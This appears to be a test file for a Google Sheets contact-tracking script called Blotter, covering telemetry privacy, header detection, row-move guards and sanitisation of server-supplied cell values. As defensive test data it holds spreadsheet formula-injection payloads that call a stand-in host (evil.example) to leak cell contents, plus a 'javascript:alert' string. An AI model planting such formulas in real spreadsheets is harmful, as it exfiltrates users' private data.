let uuidSeed = 0;
global.Utilities.getUuid = () =>
  `0000000${++uuidSeed}-0000-4000-8000-000000000000`;

const first = box.installId_();
eq('an install id is minted on first use', /^[0-9a-f-]{36}$/.test(first), true);
eq('and never changes afterwards', box.installId_(), first);
eq('nor on a third call', box.installId_(), first);

// A copied sheet is a new install: its own properties, its own id.
for (const k of Object.keys(props)) delete props[k];
const second = box.installId_();
eq('a copied sheet mints its own id', second !== first, true);

const payload = box.telemetryPayload_(37, 44, true);
eq('telemetry carries exactly these fields and no others',
  Object.keys(payload).sort(),
  ['at', 'contacts', 'contract_version', 'courier_version', 'install_id', 'ok', 'seconds']);
eq('the contact count is a bare number', payload.contacts, 37);
eq('and the duration', payload.seconds, 44);
eq('and whether it worked', payload.ok, true);
const serialised = JSON.stringify(payload).toLowerCase();
for (const forbidden of ['@', 'name', 'subject', 'body', 'firm', 'email']) {
  eq(`telemetry carries no "${forbidden}"`, serialised.includes(forbidden), false);
}

/* ------------------------------------------------------------------ *
 * The notice channel — a timed run cannot open a dialog, so the sheet
 * itself has to carry the message.
 * ------------------------------------------------------------------ */

eq('no notice at all', box.noticeFrom_({}), null);
eq('a null notice', box.noticeFrom_({ notice: null }), null);
eq('an empty text is not a notice', box.noticeFrom_({ notice: { level: 'info', text: '  ' } }), null);
eq('an info notice',
  box.noticeFrom_({ notice: { level: 'info', text: 'Blotter is now a paid product.' } }),
  { level: 'info', text: 'Blotter is now a paid product.', url: '' });
eq('a warning notice keeps its url',
  box.noticeFrom_({ notice: { level: 'warning', text: 'Card expiring.', url: 'https://blotterib.com/billing' } }),
  { level: 'warning', text: 'Card expiring.', url: 'https://blotterib.com/billing' });
eq('a blocked notice — the one that must survive a refused run',
  box.noticeFrom_({ notice: { level: 'blocked', text: 'Your trial has ended.' } }),
  { level: 'blocked', text: 'Your trial has ended.', url: '' });
eq('an unknown level falls back to info rather than vanishing',
  box.noticeFrom_({ notice: { level: 'catastrophe', text: 'Something.' } }).level, 'info');
/* Where the notice sits, and why it is remembered rather than recomputed.
   "Just past the last used column" reads well and is wrong: once a notice is
   written there, getLastColumn() counts it, so the next run lands six columns
   further right and abandons the old message. It would have crept across the
   sheet one notice at a time, beginning with the first one that ever mattered. */
// ---------------------------------------------------------------------------
// headerRow_ — the lynchpin of the banner change.
//
// Every position on Contacts and Found is derived from this one answer, and
// the row number is the contract's join key. Get it wrong and one person's
// answers land on another person's line, silently. So it is tested against a
// fake sheet rather than trusted.
// ---------------------------------------------------------------------------
function fakeSheet(name, grid) {
  let nextId = fakeSheet.n = (fakeSheet.n || 0) + 1;
  return {
    getSheetId: () => nextId,
    getName: () => name,
    getMaxRows: () => grid.length,
    getLastColumn: () => Math.max(0, ...grid.map((r) => r.length)),
    getRange: (row, col, numRows, numCols) => ({
      getValues: () => grid.slice(row - 1, row - 1 + numRows)
        .map((r) => Array.from({ length: numCols }, (_, i) => r[col - 1 + i] ?? '')),
    }),
  };
}
{
  const H = ['Name', 'Title', 'Firm', 'Email', 'Status', 'Days', 'Last contact',
             'Attempts', 'Next call', 'Last call', 'Closed'];

  box.resetHeaderRowCache_();
  const old = fakeSheet('Contacts', [H, ['Jamie', '', 'JPM', 'j@x.com']]);
  eq('a pre-banner sheet keeps its headers on row 1', box.headerRow_(old), 1);
  eq('and its data starts on row 2', box.firstDataRow_(old), 2);

  box.resetHeaderRowCache_();
  const banner = fakeSheet('Contacts', [['Blotter — all good.'], H, ['Jamie', '', 'JPM', 'j@x.com']]);
  eq('a banner sheet finds its headers on row 2', box.headerRow_(banner), 2);
  eq('and its data starts on row 3', box.firstDataRow_(banner), 3);

  // The banner text must never itself look like a header row.
  box.resetHeaderRowCache_();
  const decoy = fakeSheet('Contacts', [['Your name and email go below'], H, ['Jamie']]);
  eq('banner prose containing header-ish words does not fool the search',
    box.headerRow_(decoy), 2);

  box.resetHeaderRowCache_();
  const found = fakeSheet('Found', [['Add?', 'Name', 'Email', 'First seen', 'Context']]);
  eq('Found is recognised by its own anchor', box.headerRow_(found), 1);

  box.resetHeaderRowCache_();
  const foundBanner = fakeSheet('Found', [['Blotter'], ['Add?', 'Name', 'Email', 'First seen', 'Context']]);
  eq('Found with a banner finds row 2', box.headerRow_(foundBanner), 2);

  // The safe default matters more than the clever answer: a sheet we do not
  // recognise must behave exactly as it did before the banner existed.
  box.resetHeaderRowCache_();
  const strange = fakeSheet('Contacts', [['nothing'], ['familiar'], ['here']]);
  eq('an unrecognised sheet falls back to row 1', box.headerRow_(strange), 1);

  box.resetHeaderRowCache_();
  const empty = fakeSheet('Contacts', [[]]);
  eq('an empty sheet falls back to row 1', box.headerRow_(empty), 1);

  // A banner pushed further down still resolves, within the search depth.
  box.resetHeaderRowCache_();
  const deep = fakeSheet('Contacts', [['a'], ['b'], H, ['Jamie']]);
  eq('headers on row 3 are still found', box.headerRow_(deep), 3);
}


eq('text is trimmed',
  box.noticeFrom_({ notice: { level: 'info', text: '  padded  ' } }).text, 'padded');

// ---------------------------------------------------------------------------
// safeCell_ — server text must never become a formula in a student's sheet.
// ---------------------------------------------------------------------------
{
  const safe = box.safeCell_;
  // The one that matters: this would run in the student's account, under their
  // permissions, against the contacts Blotter is designed never to store.
  eq('an IMPORTXML exfiltration is neutralised',
    safe('=IMPORTXML("https://evil.example/?d="&A2,"//x")'),
    '\'=IMPORTXML("https://evil.example/?d="&A2,"//x")');
  ['=1+1', '+1', '-1', '@SUM(A1)', '\tstart'].forEach((v) =>
    ok('neutralised: ' + JSON.stringify(v), safe(v).charAt(0) === "'"));

  // Ordinary text must pass through untouched, or every notice reads oddly.
  ['Blotter — all good.', 'Appeared in a thread with Jamie Diamond',
   'jamie@jpmorgan.com', 'Liz Ream', '5 days', ''].forEach((v) =>
    eq('untouched: ' + JSON.stringify(v), safe(v), v));

  eq('null becomes an empty cell', safe(null), '');
  eq('undefined becomes an empty cell', safe(undefined), '');
  // A minus inside a sentence is not a leading minus.
  eq('a dash mid-sentence is fine', safe('call cancelled - reschedule'), 'call cancelled - reschedule');
}

/* ------------------------------------------------------------------ *
 * What a student can do to their sheet without breaking it.
 *
 * "Can I add a LinkedIn column?" is roughly the first thing a real student
 * does, and nobody had ever established what survives it. These are the cases
 * where the failure would otherwise be SILENT — a wrong answer on somebody
 * else's line, or work destroyed with nothing said.
 * ------------------------------------------------------------------ */

const HEADERS = ['Name', 'Title', 'Firm', 'Email', 'Status', 'Days', 'Last contact',
                 'Attempts', 'Next call', 'Last call', 'Closed'];

function sheetWithHeaders(name, headerRowCells, extraRows = []) {
  return fakeSheet(name, [['Blotter — all good.'], headerRowCells, ...extraRows]);
}

/* A single anchor word typed into the banner used to move the header row to 1,
   and every answer after that lands one row off, silently, on another
   person's line. The row with the MOST anchors wins now. */
{
  box.resetHeaderRowCache_();
  const stray = fakeSheet('Contacts', [['Status'], HEADERS, ['Jamie']]);
  eq('one stray anchor word in the banner does not move the header row',
    box.headerRow_(stray), 2);

  box.resetHeaderRowCache_();
  const twoStray = fakeSheet('Contacts', [['Name', 'Email'], HEADERS, ['Jamie']]);
  eq('even two stray words lose to a real header row of three',
    box.headerRow_(twoStray), 2);

  box.resetHeaderRowCache_();
  const nothing = fakeSheet('Contacts', [['just some notes'], ['nothing here'], ['Jamie']]);
  eq('a sheet with no recognisable headers falls back to row 1, the safe answer',
    box.headerRow_(nothing), 1);
}

/* A student column called Status is the worst shape the sheet can take,
   because findColumn_ takes the leftmost and Blotter overwrites it every
   quarter of an hour without a word. */
{
  box.resetHeaderRowCache_();
  eq('an ordinary sheet has no duplicate headings',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS)), []);

  box.resetHeaderRowCache_();
  eq('a student column of their own is fine',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['LinkedIn', 'Notes']))), []);

  box.resetHeaderRowCache_();
  eq('two columns of their own with the same name are their business',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['Notes', 'Notes']))), []);

  box.resetHeaderRowCache_();
  eq('but a second column called Status is caught',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', ['Status'].concat(HEADERS))), ['"Status"']);

  box.resetHeaderRowCache_();
  eq('capitalisation does not hide it',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['days']))), ['"Days"']);

  box.resetHeaderRowCache_();
  eq('a duplicated Name is caught too — it is Blotter\'s join, not decoration',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['Name']))), ['"Name"']);

  box.resetHeaderRowCache_();
  // Reported in the order the duplicates are met scanning left to right, which
  // is the order they appear on screen.
  eq('two problems are both named',
    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['Days', 'Status']))),
    ['"Days"', '"Status"']);
}

/* A formula in a Blotter column is replaced by a value on the next run, and
   setValues says nothing about it. Blotter still writes — the column is its
   own — but the student is told. */
{
  const formulaSheet = (grid) => ({
    getSheetId: () => 9001,
    getName: () => 'Contacts',
    getMaxRows: () => grid.length + 2,
    getLastColumn: () => HEADERS.length,
    getRange: (row, col, numRows, numCols) => ({
      getValues: () => [HEADERS],
      getFormulas: () => grid.slice(0, numRows)
        .map((r) => Array.from({ length: numCols }, (_, i) => r[i] ?? '')),
    }),
  });

  box.resetHeaderRowCache_();
  const clean = formulaSheet([['', '', '', '', '', '', '', '', '', '', '']]);
  eq('no formulas, nothing reported', box.formulasInBlotterColumns_(clean, 3, 1), []);

  box.resetHeaderRowCache_();
  // Column 6 is Days.
  const inDays = formulaSheet([['', '', '', '', '', '=TODAY()-C3', '', '', '', '', '']]);
  eq('a formula in Days is found, with its row and column',
    box.formulasInBlotterColumns_(inDays, 3, 1), [{ row: 3, column: 'Days' }]);

  box.resetHeaderRowCache_();
  // Column 2 is Title — the student's own. Blotter never touches it.
  const inTheirs = formulaSheet([['', '=UPPER(A3)', '', '', '', '', '', '', '', '', '']]);
  eq('a formula in a column of their own is left entirely alone',
    box.formulasInBlotterColumns_(inTheirs, 3, 1), []);

  eq('nothing to say when nothing was overwritten',
    box.overwrittenFormulaWarnings_([]), []);
  const warned = box.overwrittenFormulaWarnings_([{ row: 7, column: 'Days' }]);
  eq('the warning names the row and the column', warned[0].includes('row 7 (Days)'), true);
  eq('and says where a formula CAN live', warned[0].includes('column of your own'), true);
  const many = box.overwrittenFormulaWarnings_(
    Array.from({ length: 9 }, (_, i) => ({ row: i + 3, column: 'Days' })));
  eq('a long list is capped and counted honestly', many[0].includes('and 4 more'), true);
}

/* A student dragging rows while a run is in flight. The menu sort takes the
   script lock; a hand on the mouse does not, and the row number is the join
   key — so a sort landing between the read and the write puts Jamie's status
   on Alice's line, silently. Checked again immediately before writing. */
{
  const state = (namesNow, emailsNow) => ({
    sheet: {
      getRange: (row, col, height) => ({
        getValues: () => (col === 1 ? namesNow : emailsNow)
          .slice(0, height).map((v) => [v]),
      }),
    },
    cols: { name: 1, email: 4 },
    contacts: [
      { row: 3, name: 'Jamie Diamond', emails: ['jamie@jpmorgan.com'] },
      { row: 4, name: 'Alice Watts', emails: ['alice@ms.com'] },
    ],
  });

  eq('nothing moved, nothing said',
    box.rowsThatMoved_(state(['Jamie Diamond', 'Alice Watts'],
                             ['jamie@jpmorgan.com', 'alice@ms.com']), 3, 4), []);

  const swapped = box.rowsThatMoved_(
    state(['Alice Watts', 'Jamie Diamond'], ['alice@ms.com', 'jamie@jpmorgan.com']), 3, 4);
  eq('a swap is caught', swapped.length, 2);
  eq('and it says who was where',
    swapped[0].includes('row 3 was Jamie Diamond and is now Alice Watts'), true);

  eq('an address changed under the run is caught too',
    box.rowsThatMoved_(state(['Jamie Diamond', 'Alice Watts'],
                             ['jamie@newfirm.com', 'alice@ms.com']), 3, 4).length, 1);

  eq('a row emptied under the run is caught',
    box.rowsThatMoved_(state(['', 'Alice Watts'], ['', 'alice@ms.com']), 3, 4).length, 1);

  // Capitalisation and spacing in an address are not a move — matching has
  // always ignored both, and stopping a run over one would be a false alarm.
  eq('capitalisation alone is not a move',
    box.rowsThatMoved_(state(['Jamie Diamond', 'Alice Watts'],
                             ['Jamie@JPMorgan.com', 'alice@ms.com']), 3, 4), []);

  eq('a long scramble is capped at three examples',
    box.rowsThatMoved_(state(['x', 'y'], ['x@x.com', 'y@y.com']), 3, 4).length, 2);

  // A contact with NO email address, dragged past one that has one.
  //
  // Jon hit exactly this during the live test on 4 September 2026: two of the
  // four rows on the sheet had no address at all, and one of those was the row
  // he dragged. The guard compares addresses, so the case worth proving is that
  // an EMPTY address is still an identity — otherwise a student whose sheet
  // holds a few not-yet-filled-in people has rows the guard cannot see.
  const mixed = (namesNow, emailsNow) => ({
    sheet: {
      getRange: (row, col, height) => ({
        getValues: () => (col === 1 ? namesNow : emailsNow)
          .slice(0, height).map((v) => [v]),
      }),
    },
    cols: { name: 1, email: 4 },
    contacts: [
      { row: 3, name: 'Ana Vice', emails: [] },
      { row: 4, name: 'Sam Dealer', emails: ['jnachman17@gmail.com'] },
    ],
  });

  eq('an addressless row sitting still is not a move',
    box.rowsThatMoved_(mixed(['Ana Vice', 'Sam Dealer'], ['', 'jnachman17@gmail.com']), 3, 4), []);

  const dragged = box.rowsThatMoved_(
    mixed(['Sam Dealer', 'Ana Vice'], ['jnachman17@gmail.com', '']), 3, 4);
  eq('an addressless row dragged past an addressed one is caught', dragged.length, 2);
  eq('and it names the person who was there',
    dragged[0].includes('row 3 was Ana Vice and is now Sam Dealer'), true);

  // Two addressless rows swapping with each other genuinely cannot be seen,
  // and that is the honest limit of an address-based guard. Recorded so it is
  // a known boundary rather than a surprise: neither row has any mail to
  // attribute, so both read `Not emailed` whichever line they sit on, and
  // swapping them moves nothing that Blotter writes.
  const twoBlank = {
    sheet: { getRange: (row, col, height) => ({
      getValues: () => (col === 1 ? ['Bo Junio', 'Ana Vice'] : ['', ''])
        .slice(0, height).map((v) => [v]) }) },
    cols: { name: 1, email: 4 },
    contacts: [
      { row: 3, name: 'Ana Vice', emails: [] },
      { row: 4, name: 'Bo Junio', emails: [] },
    ],
  };
  eq('two addressless rows swapping is invisible, and harmless',
    box.rowsThatMoved_(twoBlank, 3, 4), []);
}

/* The support handle and the way out, both of which have to be in the SHEET —
   a student whose tracker has stopped is looking at the tracker. */
{
  const setup = box.expectedSetup_();
  eq('the Blotter ID is a setting Step 1 creates',
    setup.settings.includes(box.SETTING_INSTALL_ID), true);
  eq('and so is Help', setup.settings.includes(box.SETTING_HELP), true);
  eq('the ID row says it is for support', /quote this if you need help/i.test(box.SETTING_INSTALL_ID), true);

  const rows = box.instructionRows_();
  const text = rows.map((r) => `${r.a} ${r.b}`).join(' ');
  eq('Start here says the student may add columns anywhere',
    /add any columns you like, anywhere/i.test(text), true);
  eq('and that formulas in their own columns are safe',
    /put formulas in them/i.test(text), true);

  // Step 3 is where a student either populates their tracker or gives up, and
  // the old wording carried neither idea it needed. Raised by Jon reading it
  // cold, 4 September 2026. Asserted so the copy cannot quietly regress.
  eq('Start here tells the student to bring the list they already keep',
    /you almost certainly track this somewhere already/i.test(text), true);
  eq('and that this becomes their tracker from now on',
    /from here on this is your tracker/i.test(text), true);
  eq('and it still warns about autocorrected hyphens in addresses',
    /hyphen your keyboard autocorrects/i.test(text), true);
  eq('and it still points at the Found tab as how the list grows',
    /found tab/i.test(text), true);
  eq('and which headings to leave alone', /Leave alone/i.test(text), true);
  eq('and that a formula in a Blotter column will not survive',
    /will not survive/i.test(text), true);
  eq('and names Step 1 as the repair', /Step 1: Set up this sheet/i.test(text), true);
  eq('and gives a way to reach a human', text.includes(box.HELP_EMAIL), true);
  eq('which is the support address, not a person', box.HELP_EMAIL, 'blotterib@gmail.com');
  eq('and the help page is one that exists', box.HELP_URL, 'https://blotterib.com/contact');
}

/* ------------------------------------------------------------------ *
 * A key belongs to a SHEET, not a person.
 *
 * The account pseudonym that used to live here is gone. Google gives this
 * script no address for the account it runs as — the manifest asks for five
 * scopes and none of them is a userinfo one — which the diagnostic established
 * on a live sheet rather than anybody reasoning about it. Adding the sixth
 * scope would have cost an extra line on the unverified-app consent screen and
 * a forced re-authorisation for everyone installed, and that screen is where
 * students already abandon the install.
 *
 * The install id was always the better answer: minted once per sheet, and it
 * survives a re-paste because script properties belong to the script project
 * rather than the code.
 * ------------------------------------------------------------------ */
{
  eq('nothing hashes an account any more',
    /accountHash_|ACCOUNT_SALT/.test(src), false);
  // `effectiveUserEmail_` survives, and legitimately: the calendar decline path
  // needs it to notice when the STUDENT declined their own invite. It is no
  // longer anybody's identity.
  eq('the request carries the sheet id instead', /install_id: installId_\(\)/.test(src), true);
  eq('the manifest still asks for no userinfo scope, which is why',
    fs.readFileSync(path.join(__dirname, 'appsscript.json'), 'utf8').includes('userinfo'), false);
}

/* ------------------------------------------------------------------ *
 * The design payload. A courier that renders what it is told can be told
 * to write anything, so every value is checked rather than trusted.
 * ------------------------------------------------------------------ */

eq('a real colour passes', box.safeColour_('#1a73e8'), '#1a73e8');
eq('three-digit shorthand does not', box.safeColour_('#abc'), null);
eq('a colour name does not', box.safeColour_('red'), null);
eq('nor does a formula wearing a colour’s clothes',
  box.safeColour_('=IMPORTXML("http://x")'), null);
eq('a bounded number passes', box.safeNumber_('120', 24, 600), 120);
eq('one below the floor does not', box.safeNumber_(2, 24, 600), null);
eq('one above the ceiling does not', box.safeNumber_(90000, 24, 600), null);
eq('nonsense does not', box.safeNumber_('wide', 24, 600), null);

{
  const clean = box.sanitiseDesign_({
    version: 'v1',
    status_style: { Sent: { bg: '#dfe3e8', fg: '#3c4043' } },
    widths: { contacts: { Name: 160 }, found: { Email: 200 } },
    number_formats: { 'Last contact': 'm/d/yy' },
    state_rank: { Sent: 20 },
    instructions: [{ kind: 'h2', a: 'A heading' }],
  });
  eq('a well-formed payload survives intact', clean.status_style.Sent.bg, '#dfe3e8');
  eq('and its widths', clean.widths.contacts.Name, 160);
  eq('and its ranks', clean.state_rank.Sent, 20);
  eq('and its rows', clean.instructions[0].a, 'A heading');
}

{
  const dirty = box.sanitiseDesign_({
    status_style: {
      Sent: { bg: 'javascript:alert(1)', fg: '#000000' },   // not a colour
      Nonsense: { bg: '#ffffff', fg: '#000000' },           // not a status
    },
    widths: { contacts: { Name: 99999, Sneaky: 100 } },     // out of range; unknown heading
    state_rank: { Sent: 'first' },
    instructions: [
      { kind: 'h2', a: '=IMPORTXML("https://evil/"&A2)' },  // a live formula
      { kind: 'script', a: 'something new' },               // a kind we cannot draw
    ],
  });
  eq('a colour that is not a colour is dropped', dirty.status_style, undefined);
  eq('a width out of range is dropped, and so is a heading Blotter does not own',
    dirty.widths, undefined);
  eq('a rank that is not a number is dropped', dirty.state_rank, undefined);
  eq('a formula in copy is defused, not executed',
    dirty.instructions[0].a.charAt(0), "'");
  eq('and an unknown row kind is ignored rather than guessed at',
    dirty.instructions.length, 1);
}

eq('a payload that is not an object at all', box.sanitiseDesign_('hello'), null);
eq('nor null', box.sanitiseDesign_(null), null);

/* The key field exists, empty and harmless, from today. */
eq('there is somewhere for a key to go', box.SETTING_KEY, 'Blotter key');
eq('and Step 1 creates it', box.expectedSetup_().settings.includes(box.SETTING_KEY), true);

/* ------------------------------------------------------------------ *
 * The served script must be exactly what publish.js builds from this one.
 *
 * `/Code.gs` is what the update notice sends students to. It is built, not
 * copied: comments stripped, a public header added (Jon, 3 September 2026).
 * A served file that drifts behind the repo would send students to an old
 * script with nothing anywhere saying so, a silent wrong answer, which is the
 * failure this project keeps choosing to make loud instead.
 * `node courier/publish.js` fixes any drift.
 * ------------------------------------------------------------------ */
{
  const crypto = require('node:crypto');
  const servedPath = path.join(__dirname, '..', 'web', 'public', 'Code.gs');
  const manifestPath = path.join(__dirname, '..', 'web', 'app', 'api', 'script', 'manifest.ts');

  checks += 1;
  if (!fs.existsSync(servedPath)) {
    fails += 1;
    console.error('FAIL web/public/Code.gs is missing — run: node courier/publish.js');
  } else {
    const { buildPublic, sameTokens, commentRanges } = require('./publish.js');
    const built = buildPublic(src);
    const served = fs.readFileSync(servedPath, 'utf8');
    eq('the served script is exactly what publish.js builds from this one', served === built, true);

    // The manifest is the other half of an install. A student pasting only the
    // script gets scopes Apps Script guesses, and it guesses the broad
    // spreadsheets scope rather than currentonly.
    const { appsscriptSource, appsscriptServed } = require('./publish.js');
    const mSrc = fs.readFileSync(appsscriptSource, 'utf8');
    const mOut = fs.existsSync(appsscriptServed) ? fs.readFileSync(appsscriptServed, 'utf8') : '';
    eq('the served manifest matches the one we build from', mOut === mSrc, true);
    eq('the served manifest keeps spreadsheets.currentonly',
       mOut.indexOf('spreadsheets.currentonly') !== -1, true);

    // Every notice style must carry the keys writeBanner_ actually reads.
    // They did not for weeks: the table said fill/text, the writer said
    // bg/fg, and a notice rendered with no colour on either.
    const styles = box.NOTICE_STYLES;
    const levels = Object.keys(styles);
    eq('there are three notice levels', levels.length, 3);
    levels.forEach((lv) => {
      eq('notice style ' + lv + ' has bg and fg',
         typeof styles[lv].bg === 'string' && typeof styles[lv].fg === 'string', true);
    });
    eq('and it is this code, token for token, with only the comments gone', sameTokens(src, built), true);
    eq('one comment survives: the public header', commentRanges(built).length, 1);
    eq('nothing internal survives with it',
      /blotter-ib-ws1|docs\/workstreams|jnachman|\bJon\b/.test(built), false);

    const sha = crypto.createHash('sha256').update(built).digest('hex');
    const manifest = fs.readFileSync(manifestPath, 'utf8');
    eq('the manifest records the right hash', manifest.includes(sha), true);
    eq('and the right size', manifest.includes(String(Buffer.byteLength(built))), true);
    eq('and the right version',
      manifest.includes(JSON.stringify(box.COURIER_VERSION)), true);
  }
}

/* ---------------------------------------------------------------------- *
 * safeServerCell_ — the guard on values the server chose.
 *
 * It has to stop a leading `=` without changing the type, because a Date that
 * becomes a string loses its number format and `Next call` stops reading
 * `1/17 @ 2:00 PM`.
 * ---------------------------------------------------------------------- */
{
  const { safeServerCell_, eventWords_ } = box;
  const d = new Date(2026, 8, 4, 12);
  ok('a Date passes through as a Date', safeServerCell_(d) instanceof Date);
  ok('and is the same instant', safeServerCell_(d).getTime() === d.getTime());
  ok('a number stays a number', typeof safeServerCell_(5) === 'number');
  ok('zero stays a number', typeof safeServerCell_(0) === 'number');
  ok('a dash stays a dash', safeServerCell_('\u2014') === '\u2014');
  ok('a formula string is neutralised', safeServerCell_('=IMPORTXML("x","y")').charAt(0) === "'");
  ok('a plus is neutralised too', safeServerCell_('+1').charAt(0) === "'");

  // eventWords_ must split exactly as the server's words() does, or the
  // calendar filter would drop events the server would have matched.
  eq('splits on punctuation like the server', eventWords_('Coffee chat: David Salmon!').join(','),
     'coffee,chat,david,salmon');
  eq('lowercases', eventWords_('CALL With JAMIE').join(','), 'call,with,jamie');
  eq('empty text gives nothing', eventWords_('').length, 0);
}

console.log(fails === 0
  ? `All ${checks} courier helper checks passed.`
  : `\n${fails} of ${checks} checks failed.`);
process.exit(fails === 0 ? 0 : 1);
